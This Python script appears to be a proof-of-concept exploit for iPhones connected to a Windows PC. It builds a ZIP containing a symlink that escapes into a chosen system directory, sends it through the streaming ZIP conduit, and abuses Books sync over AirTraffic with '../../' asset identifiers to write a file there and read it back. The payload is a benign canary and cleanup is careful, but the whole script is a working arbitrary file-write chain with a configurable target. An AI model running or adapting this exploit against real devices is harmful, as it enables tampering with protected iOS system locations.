#!/usr/bin/env python3
"""Fresh-file AirLift canary for paired iPhones on Windows."""

from __future__ import annotations

import argparse
import asyncio
import ctypes
import hashlib
import inspect
import io
import json
import os
import platform
import plistlib
import posixpath
import re
import secrets
import stat
import struct
import sys
import time
import traceback
import uuid
import zipfile
from dataclasses import dataclass
from pathlib import Path
from typing import Any

from pymobiledevice3.lockdown import create_using_usbmux
from pymobiledevice3.services.afc import AfcService
from pymobiledevice3.usbmux import list_devices as list_mux_devices


ROOT = Path(__file__).resolve().parent
TARGET_HEADER = ROOT / "Sources" / "airlift_target.h"
TARGET_TEXT = TARGET_HEADER.read_text(encoding="utf-8")


def header_string(name: str) -> str:
    match = re.search(
        rf'^#define\s+{re.escape(name)}\s+@"([^"]*)"$',
        TARGET_TEXT,
        re.MULTILINE,
    )
    if not match:
        raise RuntimeError(f"missing {name} in {TARGET_HEADER}")
    return match.group(1)


def header_targets(name: str) -> tuple[tuple[str, str], ...]:
    match = re.search(
        rf"^#define\s+{re.escape(name)}\(X\)\s+(.*?)(?=^\s*$)",
        TARGET_TEXT,
        re.MULTILINE | re.DOTALL,
    )
    if not match:
        raise RuntimeError(f"missing {name} in {TARGET_HEADER}")
    targets = tuple(
        re.findall(r'X\(@"([^"]+)",\s*@"([^"]+)"\)', match.group(1))
    )
    if not targets:
        raise RuntimeError(f"empty {name} in {TARGET_HEADER}")
    return targets


TESTED_BUILDS = frozenset(header_targets("AIRLIFT_TESTED_BUILDS"))
SOURCE_PREFIX = header_string("AIRLIFT_SOURCE_PREFIX")
LINK_PREFIX = header_string("AIRLIFT_LINK_PREFIX")
RECOVERED_PREFIX = header_string("AIRLIFT_RECOVERED_PREFIX")
CANARY_PREFIX = header_string("AIRLIFT_CANARY_PREFIX")
DEFAULT_TARGET = "/var/mobile/Library/SpringBoard"
AIRLOCK_ROOT = "/var/mobile/Media/Airlock/Book"
SZ_EXTRA_ID = 0x5A53
MAX_BOOKS_FILE_BYTES = 128 * 1024 * 1024
MAX_BOOKS_SNAPSHOT_BYTES = 256 * 1024 * 1024
BOOKS_FILES = (
    "Books/Books.plist",
    "Books/Sync/Books.plist",
    "Books/Sync/Upload.plist",
    "Books/Sync/Database/OutstandingAssets_4.sqlite",
    "Books/Sync/Database/OutstandingAssets_4.sqlite-shm",
    "Books/Sync/Database/OutstandingAssets_4.sqlite-wal",
)
BOOKS_DIRECTORIES = ("Books", "Books/Sync", "Books/Sync/Database")
APPLE_DLL_DIRECTORIES = (
    r"C:\Program Files\Common Files\Apple\Mobile Device Support",
    r"C:\Program Files\iTunes",
    r"C:\Program Files (x86)\Common Files\Apple\Mobile Device Support",
)


class AirLiftError(RuntimeError):
    """A required AirLift safety or protocol gate did not pass."""


@dataclass(frozen=True)
class BooksSnapshot:
    files: dict[str, bytes | None]
    directories: dict[str, bool]


def normalize_target(value: str) -> str:
    target = posixpath.normpath(value)
    if not target.startswith("/") or target == "/" or "\x00" in target:
        raise AirLiftError("target must be a non-root absolute directory")
    if any(component in ("", ".", "..") for component in target[1:].split("/")):
        raise AirLiftError("target contains an unsafe path component")
    if len(target.encode()) > 768:
        raise AirLiftError("target path is too long")
    return target


def _zip_info(name: str, mode: int) -> zipfile.ZipInfo:
    info = zipfile.ZipInfo(name, date_time=(2026, 9, 14, 5, 0, 0))
    info.create_system = 3
    info.compress_type = zipfile.ZIP_STORED
    info.external_attr = (mode & 0xFFFF) << 16
    info.extra = struct.pack("<HHH", SZ_EXTRA_ID, 2, mode & 0xFFFF)
    return info


def build_archive(target: str, payload: bytes) -> bytes:
    target_tail = normalize_target(target)[1:]
    metadata = plistlib.dumps({"Version": 2}, fmt=plistlib.FMT_BINARY, sort_keys=True)
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", allowZip64=False) as archive:
        archive.writestr(_zip_info("META-INF/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            _zip_info("META-INF/com.apple.ZipMetadata.plist", stat.S_IFREG | 0o600),
            metadata,
        )
        for directory in ("p0/", "p0/p1/", "p0/p1/p2/"):
            archive.writestr(_zip_info(directory, stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            _zip_info("p0/p1/p2/link", stat.S_IFLNK | 0o777),
            f"../../../{target_tail}".encode(),
        )
        cursor = ""
        for component in target_tail.split("/"):
            cursor += component + "/"
            archive.writestr(_zip_info(cursor, stat.S_IFDIR | 0o755), b"")
        archive.writestr(_zip_info("payload", stat.S_IFREG | 0o600), payload)
    return output.getvalue()


def build_books(identifiers: list[str]) -> bytes:
    rows = [
        {"Persistent ID": identifier, "Item ID": str(index), "DSID": "1"}
        for index, identifier in enumerate(identifiers, 1)
    ]
    return plistlib.dumps({"Books": rows}, fmt=plistlib.FMT_BINARY, sort_keys=True)


class AirTrafficHost:
    """Strict ctypes wrapper for the upstream AirTraffic host sequence."""

    def __init__(self) -> None:
        directory = next(
            (
                candidate
                for candidate in APPLE_DLL_DIRECTORIES
                if os.path.isfile(os.path.join(candidate, "AirTrafficHost.dll"))
            ),
            None,
        )
        if directory is None:
            raise AirLiftError(
                "AirTrafficHost.dll was not found; install Apple Mobile Device Support"
            )
        for candidate in APPLE_DLL_DIRECTORIES:
            if os.path.isdir(candidate):
                os.add_dll_directory(candidate)

        self.core_foundation = ctypes.CDLL(os.path.join(directory, "CoreFoundation.dll"))
        self.airtraffic = ctypes.CDLL(os.path.join(directory, "AirTrafficHost.dll"))
        pointer = ctypes.c_void_p
        functions = (
            (self.core_foundation.CFStringCreateWithCString, pointer, [pointer, ctypes.c_char_p, ctypes.c_uint32]),
            (self.core_foundation.CFStringGetCString, ctypes.c_bool, [pointer, ctypes.c_char_p, ctypes.c_int64, ctypes.c_uint32]),
            (self.core_foundation.CFDataCreate, pointer, [pointer, pointer, ctypes.c_int64]),
            (self.core_foundation.CFDataGetLength, ctypes.c_int64, [pointer]),
            (self.core_foundation.CFDataGetBytePtr, pointer, [pointer]),
            (self.core_foundation.CFPropertyListCreateData, pointer, [pointer, pointer, ctypes.c_int64, ctypes.c_int64, pointer]),
            (self.core_foundation.CFPropertyListCreateWithData, pointer, [pointer, pointer, ctypes.c_int64, pointer, pointer]),
            (self.core_foundation.CFRelease, None, [pointer]),
            (self.airtraffic.ATHostConnectionCreate, pointer, [pointer]),
            (self.airtraffic.ATHostConnectionRelease, None, [pointer]),
            (self.airtraffic.ATHostConnectionSendHostInfo, None, [pointer, pointer]),
            (self.airtraffic.ATHostConnectionSendSyncRequest, None, [pointer, pointer, pointer, pointer]),
            (self.airtraffic.ATHostConnectionSendMetadataSyncFinished, None, [pointer, pointer, pointer]),
            (self.airtraffic.ATHostConnectionSendAssetCompleted, None, [pointer, pointer, pointer, pointer]),
            (self.airtraffic.ATHostConnectionReadMessage, pointer, [pointer]),
            (self.airtraffic.ATCFMessageGetName, pointer, [pointer]),
            (self.airtraffic.ATCFMessageGetParam, pointer, [pointer, pointer]),
        )
        for function, result_type, arguments in functions:
            function.restype = result_type
            function.argtypes = arguments

    def release(self, *references: Any) -> None:
        for reference in references:
            if reference:
                self.core_foundation.CFRelease(reference)

    def string(self, value: str) -> Any:
        reference = self.core_foundation.CFStringCreateWithCString(
            None, value.encode(), 0x08000100
        )
        if not reference:
            raise AirLiftError("CoreFoundation string allocation failed")
        return reference

    def string_value(self, reference: Any) -> str | None:
        if not reference:
            return None
        buffer = ctypes.create_string_buffer(4096)
        if not self.core_foundation.CFStringGetCString(
            reference, buffer, len(buffer), 0x08000100
        ):
            return None
        return buffer.value.decode("utf-8", errors="replace")

    def property_list(self, value: Any) -> Any:
        raw = plistlib.dumps(value, fmt=plistlib.FMT_BINARY, sort_keys=True)
        data = self.core_foundation.CFDataCreate(None, raw, len(raw))
        if not data:
            raise AirLiftError("CoreFoundation data allocation failed")
        try:
            result = self.core_foundation.CFPropertyListCreateWithData(
                None, data, 0, None, None
            )
        finally:
            self.release(data)
        if not result:
            raise AirLiftError("CoreFoundation property-list conversion failed")
        return result

    def python_value(self, reference: Any) -> Any:
        if not reference:
            return None
        data = self.core_foundation.CFPropertyListCreateData(None, reference, 200, 0, None)
        if not data:
            return None
        try:
            raw = ctypes.string_at(
                self.core_foundation.CFDataGetBytePtr(data),
                self.core_foundation.CFDataGetLength(data),
            )
        finally:
            self.release(data)
        return plistlib.loads(raw)

    def _read_name(self, connection: Any) -> tuple[Any, str | None]:
        message = self.airtraffic.ATHostConnectionReadMessage(connection)
        name = (
            self.string_value(self.airtraffic.ATCFMessageGetName(message))
            if message
            else None
        )
        return message, name

    def _wait_for(self, connection: Any, expected: str, attempts: int) -> bool:
        for _ in range(attempts):
            message, name = self._read_name(connection)
            if not message:
                continue
            self.release(message)
            if name == expected:
                return True
            if name == "SyncFailed":
                raise AirLiftError("AirTraffic reported SyncFailed")
        return False

    def _manifest(self, connection: Any) -> dict[str, Any] | None:
        for _ in range(20):
            message, name = self._read_name(connection)
            if not message:
                continue
            try:
                if name == "AssetManifest":
                    key = self.string("AssetManifest")
                    try:
                        value = self.python_value(
                            self.airtraffic.ATCFMessageGetParam(message, key)
                        )
                    finally:
                        self.release(key)
                    return value if isinstance(value, dict) else None
                if name in ("SyncFailed", "SyncFinished"):
                    return None
            finally:
                self.release(message)
        return None

    @staticmethod
    def _manifest_contains(manifest: dict[str, Any], identifier: str) -> bool:
        books = manifest.get("Book")
        if not isinstance(books, list):
            return False
        return any(
            isinstance(item, dict)
            and item.get("AssetID") == identifier
            and bool(item.get("IsDownload"))
            for item in books
        )

    def run(self, device_udid: str, assets: list[tuple[str, str]]) -> dict[str, Any]:
        if not 1 <= len(assets) <= 4 or any(
            not identifier or not path for identifier, path in assets
        ):
            raise AirLiftError("AirTraffic requires one to four non-empty assets")

        device = self.string(device_udid)
        connection = self.airtraffic.ATHostConnectionCreate(device)
        if not connection:
            self.release(device)
            raise AirLiftError("AirTraffic connection failed")

        host_info = self.property_list(
            {
                "Type": "iTunes",
                "Version": "13.7.0.161",
                "MacOSVersion": platform.platform(),
                "SyncHostName": "airlift",
                "LibraryID": str(uuid.uuid4()).upper(),
                "SyncedDataclasses": ["Book"],
                "SyncedAssetTypes": ["Book"],
                "Wakeable": False,
            }
        )
        data_classes = self.property_list(["Book"])
        anchors = self.property_list({})
        sync_types = self.property_list({"Book": 1})
        try:
            if not self._wait_for(connection, "SyncAllowed", 8):
                raise AirLiftError("SyncAllowed was not observed")
            self.airtraffic.ATHostConnectionSendHostInfo(connection, host_info)
            time.sleep(0.2)
            self.airtraffic.ATHostConnectionSendSyncRequest(
                connection, data_classes, anchors, host_info
            )
            if not self._wait_for(connection, "ReadyForSync", 12):
                raise AirLiftError("ReadyForSync was not observed")
            self.airtraffic.ATHostConnectionSendMetadataSyncFinished(
                connection, sync_types, anchors
            )

            manifest = self._manifest(connection)
            if manifest is None:
                raise AirLiftError("AssetManifest was not observed")
            missing = [
                identifier
                for identifier, _ in assets
                if not self._manifest_contains(manifest, identifier)
            ]
            if missing:
                raise AirLiftError(
                    f"expected assets absent from manifest: {len(missing)}"
                )

            for index, (identifier, destination) in enumerate(assets):
                identifier_ref = self.string(identifier)
                data_class_ref = self.string("Book")
                destination_ref = self.string(destination)
                try:
                    self.airtraffic.ATHostConnectionSendAssetCompleted(
                        connection, identifier_ref, data_class_ref, destination_ref
                    )
                finally:
                    self.release(identifier_ref, data_class_ref, destination_ref)
                if index + 1 < len(assets):
                    time.sleep(0.9)
            time.sleep(2)
            return {
                "ok": True,
                "syncAllowed": True,
                "readyForSync": True,
                "fileCompleteMessages": len(assets),
            }
        finally:
            self.airtraffic.ATHostConnectionRelease(connection)
            self.release(device, host_info, data_classes, anchors, sync_types)


async def exists(afc: Any, path: str) -> bool:
    try:
        await afc.stat(path)
        return True
    except Exception:
        return False


async def file_kind(afc: Any, path: str) -> str | None:
    try:
        return (await afc.stat(path)).get("st_ifmt")
    except Exception:
        return None


async def remove_if_present(afc: Any, path: str) -> bool:
    if not await exists(afc, path):
        return True
    try:
        failures = await afc.rm(path, force=True)
    except Exception:
        return False
    return not failures and not await exists(afc, path)


async def ensure_directory(afc: Any, path: str) -> bool:
    if await exists(afc, path):
        return await file_kind(afc, path) == "S_IFDIR"
    try:
        await afc.makedirs(path)
    except Exception:
        return False
    return await file_kind(afc, path) == "S_IFDIR"


async def snapshot_books(afc: Any) -> BooksSnapshot:
    files: dict[str, bytes | None] = {}
    total = 0
    for path in BOOKS_FILES:
        kind = await file_kind(afc, path)
        if kind is not None and kind != "S_IFREG":
            raise AirLiftError(f"unexpected Books file type: {path}")
        if kind is None:
            files[path] = None
            continue
        size = int((await afc.stat(path)).get("st_size", 0))
        if size > MAX_BOOKS_FILE_BYTES or total + size > MAX_BOOKS_SNAPSHOT_BYTES:
            raise AirLiftError("Books snapshot exceeds its safety limit")
        data = await afc.get_file_contents(path)
        if len(data) != size:
            raise AirLiftError(f"Books snapshot length mismatch: {path}")
        total += len(data)
        files[path] = data
    directories: dict[str, bool] = {}
    for path in BOOKS_DIRECTORIES:
        kind = await file_kind(afc, path)
        if kind is not None and kind != "S_IFDIR":
            raise AirLiftError(f"unexpected Books directory type: {path}")
        directories[path] = kind == "S_IFDIR"
    return BooksSnapshot(files=files, directories=directories)


async def books_match(afc: Any, snapshot: BooksSnapshot) -> bool:
    try:
        return await snapshot_books(afc) == snapshot
    except AirLiftError:
        return False


async def restore_books(afc: Any, snapshot: BooksSnapshot) -> dict[str, Any]:
    failures: list[str] = []
    for path, data in snapshot.files.items():
        if data is None:
            if not await remove_if_present(afc, path):
                failures.append(path)
            continue
        if not await ensure_directory(afc, posixpath.dirname(path)):
            failures.append(posixpath.dirname(path))
            continue
        try:
            await afc.set_file_contents(path, data)
        except Exception:
            failures.append(path)
    for path in reversed(BOOKS_DIRECTORIES):
        if not snapshot.directories[path] and not await remove_if_present(afc, path):
            failures.append(path)
    verified = not failures and await books_match(afc, snapshot)
    return {"ok": verified, "failures": failures, "preimageVerified": verified}


async def stage(
    lockdown: Any,
    afc: Any,
    source: str,
    link: str,
    recovered: str,
    identifiers: list[str],
    target_directory: str,
    payload: bytes,
    snapshot: BooksSnapshot,
) -> dict[str, Any]:
    if not await books_match(afc, snapshot):
        raise AirLiftError("Books state changed before staging")
    for path in (source, link, recovered):
        if await exists(afc, path):
            raise AirLiftError("generated AirLift path already exists")

    service = await lockdown.start_lockdown_service("com.apple.streaming_zip_conduit")
    response_observed = False
    try:
        await service.send_plist({"MediaSubdir": source})
        await service.sendall(build_archive(target_directory, payload))
        try:
            response_observed = (
                await asyncio.wait_for(service.recv_plist(), timeout=30) is not None
            )
        except Exception:
            response_observed = False
    finally:
        close = getattr(service, "close", None)
        if close:
            result = close()
            if inspect.isawaitable(result):
                await result

    expected_paths = (
        source,
        f"{source}/p0/p1/p2/link",
        f"{source}/payload",
    )
    if not all([await exists(afc, path) for path in expected_paths]):
        raise AirLiftError("Streaming ZIP extraction did not produce expected objects")
    if not await ensure_directory(afc, "Books/Sync"):
        raise AirLiftError("could not create Books sync directory")
    await afc.set_file_contents("Books/Sync/Books.plist", build_books(identifiers))
    return {
        "ok": True,
        "zipResponseObserved": response_observed,
        "sourceObjectsPresent": True,
        "booksWritten": True,
    }


async def finish(
    afc: Any,
    source: str,
    link: str,
    recovered: str,
    target_leaf: str,
    expected: bytes,
    snapshot: BooksSnapshot,
    wait_for_recovered: bool,
) -> dict[str, Any]:
    observed = None
    attempts = 0
    for _ in range(60 if wait_for_recovered else 1):
        attempts += 1
        try:
            observed = await afc.get_file_contents(recovered)
        except Exception:
            observed = None
        if observed == expected:
            break
        if wait_for_recovered:
            await asyncio.sleep(0.25)

    failures: list[str] = []
    target_through_link = posixpath.join(link, target_leaf)
    if not await remove_if_present(afc, target_through_link):
        failures.append("target canary")
    target_absent = not await exists(afc, target_through_link)
    for name, path in (
        ("relocated link", link),
        ("recovered file", recovered),
        ("StreamingZip tree", source),
    ):
        if not await remove_if_present(afc, path):
            failures.append(name)
    await asyncio.sleep(2)
    books_restore = await restore_books(afc, snapshot)
    if not books_restore["ok"]:
        failures.append("Books preimage")

    source_absent = not await exists(afc, source)
    link_absent = not await exists(afc, link)
    recovered_absent = not await exists(afc, recovered)
    cleanup_complete = bool(
        not failures
        and target_absent
        and source_absent
        and link_absent
        and recovered_absent
        and books_restore["ok"]
    )
    return {
        "ok": observed == expected and cleanup_complete,
        "recoveredPresent": observed is not None,
        "recoveredBytesMatch": observed == expected,
        "readbackAttempts": attempts,
        "observedLength": len(observed) if observed is not None else 0,
        "cleanupComplete": cleanup_complete,
        "failures": failures,
        "targetAbsent": target_absent,
        "sourceAbsent": source_absent,
        "linkAbsent": link_absent,
        "recoveredAbsent": recovered_absent,
        "booksPreimageRestored": books_restore["ok"],
        "booksRestore": books_restore,
    }


async def resolve_device(requested: str | None) -> dict[str, Any]:
    devices: list[dict[str, Any]] = []
    for mux_device in await list_mux_devices():
        try:
            lockdown = await create_using_usbmux(serial=mux_device.serial)
            product = lockdown.product_type or ""
            if not product.startswith("iPhone"):
                continue
            version = lockdown.product_version or "unknown"
            build = await lockdown.get_value(key="BuildVersion") or "unknown"
            name = lockdown.display_name or product
            devices.append(
                {
                    "udid": mux_device.serial,
                    "product": product,
                    "version": version,
                    "build": build,
                    "name": name,
                    "tested": (version, build) in TESTED_BUILDS,
                    "lockdown": lockdown,
                }
            )
        except Exception:
            continue
    if not devices:
        raise AirLiftError("no paired physical iPhone found")
    if requested:
        selected = next(
            (
                device
                for device in devices
                if device["udid"].casefold() == requested.casefold()
            ),
            None,
        )
        if selected is None:
            raise AirLiftError("requested device is not connected")
        return selected
    if len(devices) == 1:
        return devices[0]
    if not sys.stdin.isatty():
        raise AirLiftError("multiple devices are connected; pass --device UDID")
    print("Available paired iPhones:", file=sys.stderr)
    for index, device in enumerate(devices, 1):
        print(
            f"  [{index}] {device['name']} - {device['product']} - "
            f"iOS {device['version']} ({device['build']})",
            file=sys.stderr,
        )
    while True:
        print("Select device: ", end="", file=sys.stderr, flush=True)
        try:
            selection = int(sys.stdin.readline().strip())
        except (ValueError, KeyboardInterrupt):
            selection = 0
        if 1 <= selection <= len(devices):
            return devices[selection - 1]
        print(f"Enter a number from 1 to {len(devices)}.", file=sys.stderr)


async def run(target: str, requested_device: str | None, verbose: bool) -> dict[str, Any]:
    target = normalize_target(target)
    device = await resolve_device(requested_device)
    if not device["tested"]:
        print(
            f"Warning: {device['product']} on iOS {device['version']} "
            f"({device['build']}) is expected to work but has not been tested upstream.",
            file=sys.stderr,
        )

    token = secrets.token_hex(10)
    source = f"{SOURCE_PREFIX}{token}"
    link = f"{LINK_PREFIX}{token}"
    recovered = f"{RECOVERED_PREFIX}{token}"
    leaf = f"{CANARY_PREFIX}{secrets.token_hex(16)}.bin"
    payload = (
        f"airlift canary\nbuild={device['build']}\nnonce={secrets.token_hex(24)}\n"
    ).encode()
    target_path = posixpath.join(target, leaf)
    identifiers = [
        f"../../{source}/p0/p1/p2/link",
        f"../../{source}/payload",
        posixpath.relpath(target_path, AIRLOCK_ROOT),
    ]
    destinations = [link, posixpath.join(link, leaf), recovered]

    afc = AfcService(lockdown=device["lockdown"])
    await afc.connect()
    snapshot = await snapshot_books(afc)
    stage_result: dict[str, Any] = {"ok": False}
    airtraffic_result: dict[str, Any] = {"ok": False}
    operation_error: dict[str, Any] | None = None
    airtraffic_attempted = False
    try:
        stage_result = await stage(
            device["lockdown"],
            afc,
            source,
            link,
            recovered,
            identifiers,
            target,
            payload,
            snapshot,
        )
        airtraffic_attempted = True
        airtraffic_result = AirTrafficHost().run(
            device["udid"], list(zip(identifiers, destinations))
        )
    except Exception as error:
        operation_error = {
            "type": type(error).__name__,
            "message": str(error),
            "traceback": traceback.format_exc(limit=8),
        }
    finally:
        finish_result = await finish(
            afc,
            source,
            link,
            recovered,
            leaf,
            payload,
            snapshot,
            airtraffic_attempted,
        )
        try:
            await afc.aclose()
        except Exception:
            pass

    exact = bool(finish_result["recoveredBytesMatch"])
    clean = bool(finish_result["cleanupComplete"])
    primary: dict[str, Any] = {
        "booksPreimagePaths": [
            path for path, contents in snapshot.files.items() if contents is not None
        ],
        "stageSucceeded": bool(stage_result.get("ok")),
        "airTrafficSucceeded": bool(airtraffic_result.get("ok")),
        "exactBytesRecovered": exact,
        "cleanupComplete": clean,
        "targetAbsent": finish_result["targetAbsent"],
        "booksPreimageRestored": finish_result["booksPreimageRestored"],
    }
    ok = bool(primary["stageSucceeded"] and primary["airTrafficSucceeded"] and exact and clean)
    if verbose or not ok:
        primary["diagnostics"] = {
            "stage": stage_result,
            "airTraffic": airtraffic_result,
            "finish": finish_result,
        }
        if operation_error:
            primary["diagnostics"]["operationError"] = operation_error
    return {
        "ok": ok,
        "device": {
            "product": device["product"],
            "version": device["version"],
            "build": device["build"],
            "tested": device["tested"],
        },
        "targetDirectory": target,
        "generatedLeaf": leaf,
        "payloadLength": len(payload),
        "payloadSHA256": hashlib.sha256(payload).hexdigest(),
        "newFileWrite": "confirmed" if exact else "not-confirmed",
        "exportRead": "confirmed" if exact else "not-confirmed",
        "exactBytesRecovered": exact,
        "cleanupComplete": clean,
        "existingFileTargeted": False,
        "primary": primary,
    }


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--target", default=DEFAULT_TARGET)
    parser.add_argument("--device")
    parser.add_argument("--verbose", action="store_true")
    args = parser.parse_args()
    try:
        report = asyncio.run(run(args.target, args.device, args.verbose))
    except Exception as error:
        report = {
            "ok": False,
            "error": {"type": type(error).__name__, "message": str(error)},
        }
    print(json.dumps(report, indent=2, sort_keys=True))
    return 0 if report.get("ok") else 2


if __name__ == "__main__":
    raise SystemExit(main())
